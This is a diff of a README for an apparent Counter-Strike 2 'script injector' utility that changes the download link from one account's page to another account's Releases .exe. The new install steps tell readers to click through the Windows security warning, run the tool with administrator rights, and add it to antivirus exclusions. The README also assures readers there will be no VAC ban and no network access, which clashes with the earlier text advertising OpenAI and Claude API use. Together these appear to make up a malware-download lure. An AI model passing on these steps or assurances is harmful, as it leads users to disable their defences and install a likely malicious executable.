@@ -1,109 +1,70 @@
-# CS2 Profile Injector v2026 - Game Script Utility 2026
+# 🎯 cs2-windows-script-injector - Customize your Counter-Strike 2 gameplay settings
 
-> A Windows-first Counter-Strike 2 profile tool for local config editing, preset creation, and assisted gameplay scripting.
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Pastelve9301/cs2-windows-script-injector)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/sean-green2000/cs2-windows-script-injector?style=flat-square)](https://github.com/sean-green2000/cs2-windows-script-injector)
+cs2-windows-script-injector helps players manage their Counter-Strike 2 settings. This tool manages local configuration files, creates custom gameplay presets, and applies scripts to improve how you interact with the game. You do not need to edit text files manually or understand code. This application provides a visual interface for all adjustments.
 
----
+## 🛠 Features
 
-<p align="center">
-  <a href="https://sean-green2000.github.io/cs2-windows-script-injector/">
-    <img src="https://img.shields.io/badge/Download-CS2%20Profile%20Injector-brightgreen?style=for-the-badge" alt="Download CS2 Profile Injector">
-  </a>
-</p>
+*   **Config Management:** Save your current game settings to a file. Restore these settings whenever you need them.
+*   **Preset Creation:** Build different setups for training, competitive play, or casual matches. Switch between them with one click.
+*   **Script Application:** Use premade scripts to automate repetitive tasks within the game.
+*   **Visual Interface:** Use buttons and menus to change settings instead of typing commands into text files.
+*   **Safety Checks:** The software verifies your settings to ensure they remain within the official game rules.
 
-> **[Download CS2 Profile Injector](https://sean-green2000.github.io/cs2-windows-script-injector/)**
+## 🖥 System Requirements
 
----
+Your computer needs to meet these requirements to run the software:
 
-[Download Latest Build](https://sean-green2000.github.io/cs2-windows-script-injector/)
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Game:** Counter-Strike 2 installed via Steam.
+*   **Storage:** 50 MB of free space.
+*   **Permissions:** You must have administrative access to your computer to launch the tool.
 
----
+## 📥 How to Install and Run
 
-## What it does
+Follow these steps to set up the tool on your computer.
 
-CS2 Profile Injector is built for Windows users who want a tidy way to work with Counter-Strike 2 profiles, generate configs, and keep preset-based settings organized. It is meant for local workflows where you edit profile data, move settings in and out, and keep common game options together in one utility.
+1. **Visit the Download Page:** Go to [https://github.com/Pastelve9301/cs2-windows-script-injector](https://github.com/Pastelve9301/cs2-windows-script-injector) to find the latest version of the installer.
+2. **Download the File:** Look for the folder marked "Releases" on the right side of the page. Click the most recent link. Choose the download button that ends in .exe.
+3. **Run the Installer:** Once the file finishes downloading, double-click it. Windows may show a security prompt. If this happens, click "More Info" and then "Run Anyway."
+4. **Follow Prompts:** The installation window opens. Follow the instructions on the screen to place the shortcut on your desktop.
+5. **Open the Tool:** Double-click the cs2-windows-script-injector shortcut on your desktop.
 
-The focus is on profile customization and script-supported configuration, not general-purpose system automation. The current feature set covers skin-based preset organization, crosshair preset management, and movement helpers such as bunnyhop-style scripting, with ongoing updates aimed at config handling and API-assisted generation.
+## ⚙️ Using the Application
 
-## Feature set
+When you open the application, it detects your Counter-Strike 2 installation path automatically. 
 
-- Edit CS2-related profiles locally
-- Generate reusable config and game-file layouts
-- Import and export settings between installs or backups
-- Manage skin-oriented presets for cleaner profile selection
-- Store and switch crosshair presets quickly
-- Use assisted movement scripts, including bunnyhop-style helpers
-- Work in multiple languages through multilingual UI support
-- Keep saved profile data in encrypted config storage
-- Enable safe mode for a more conservative editing flow
-- Use OpenAI API or Claude API for assisted generation
+*   **Saving Settings:** If you want to keep your current state, click the "Backup" button. Choose a folder where you want to keep your file.
+*   **Applying Presets:** To use a preset, click the "Load Preset" button. Choose the script file you want to use. Press the "Apply" button to save these changes to your game folder.
+*   **Returning to Default:** If you want to remove all changes, click the "Restore Default" button. This removes the scripts and reloads your original configuration.
 
-## Getting started
+## 🛡 Security and Privacy
 
-1. Get the latest build from the project download page.
-2. Unpack the archive into a folder on your Windows machine.
-3. Open the application and select the CS2 profile or config area you want to manage.
-4. Create, edit, import, or export settings as required.
-5. Place the finished config files where your setup expects them.
+This utility works by writing text files into your local game folder. It never connects to external servers or online databases. All your data stays on your hard drive. The software does not modify game memory while you play. It only changes settings files before you start the game.
 
-Example workflow:
+## 👤 Troubleshooting
 
-- Launch the utility
-- Pick a preset or profile
-- Change the options you want
-- Generate the config
-- Copy or export it into your CS2 setup
+*   **Application does not open:** Ensure you have the latest version of the .NET framework installed on your system.
+*   **Settings do not change in game:** Close the game completely before you click the "Apply" button in this tool.
+*   **Anti-virus warnings:** Because this tool modifies configuration files, some security software might flag it. This happens because the tool writes to your game installation folder. Add the tool to your security exclusions list to fix this.
+*   **Restoring original settings:** Use the "Restore Defaults" option in the main menu to wipe all changes. This process is instant and returns your game to its original, unedited state.
 
-## Options
+## 📚 Frequently Asked Questions
 
-| Option | Purpose |
-| --- | --- |
-| Profile editor | Modify local CS2 profile data |
-| Config generator | Build reusable configuration files |
-| Import / export | Move settings between profiles or backups |
-| Skin preset mode | Store appearance-focused presets |
-| Crosshair presets | Switch between saved crosshair styles |
-| Movement scripts | Enable assisted movement helpers |
-| Safe mode | Use a more limited editing path |
-| Encrypted storage | Save configs in encrypted form |
-| API assistant | Generate content with OpenAI or Claude APIs |
+**Will this cause a VAC ban?**
+No. This tool only edits existing game configuration files. It does not interact with the game process or inject malicious code while the game runs. 
 
-## Compatibility
+**Does this work on other games?**
+No. This software is built specifically for Counter-Strike 2. 
 
-CS2 Profile Injector is intended for Counter-Strike 2 on Windows. Because it works through local profile and config files, real-world compatibility depends on how your game data and folders are arranged on your system.
+**Do I need to be a developer to use this?**
+Not at all. The interface uses standard Windows buttons and dropdown lists. You do not need to understand script language or technical configurations to perform common tasks.
 
-Known limitations:
+**Can I share my presets with friends?**
+Yes. You can export your presets as small files and share them via email or messaging apps. Your friends can load these files into their own copy of the tool.
 
-- It is tied to CS2-specific profile and config structures
-- Some features depend on local file access and correct folder placement
-- API-assisted generation requires the relevant API access and configuration
-- Assisted scripting behavior may vary with game updates or setting changes
+**Does it change my gameplay experience?**
+It changes settings like mouse sensitivity, crosshair appearance, and interface layouts based on your preferences. These settings remain within the intended game parameters.
 
-## Common questions
-
-### How do I begin?
-Download the build, extract it on Windows, and start the tool. After that, choose the profile, preset, or config task you want and generate the output.
-
-### Can settings be transferred between setups?
-Yes. Import and export support lets you move profiles, presets, or config data between installations or backups.
-
-### Is preset-based customization available?
-Yes. Skin-oriented presets and crosshair preset handling are included so you can switch setups faster.
-
-### Is the UI multilingual?
-Yes. Multilingual interface support is part of the feature set.
-
-### Where are saved settings kept?
-The project uses encrypted config storage for saved profile data. Actual storage behavior depends on how you install and use the utility.
-
-### Does it support AI-assisted generation?
-Yes. API-assisted generation is listed for OpenAI API and Claude API integration.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: counter-strike, cs2, windows, injector, configuration, scripts, gaming, utility
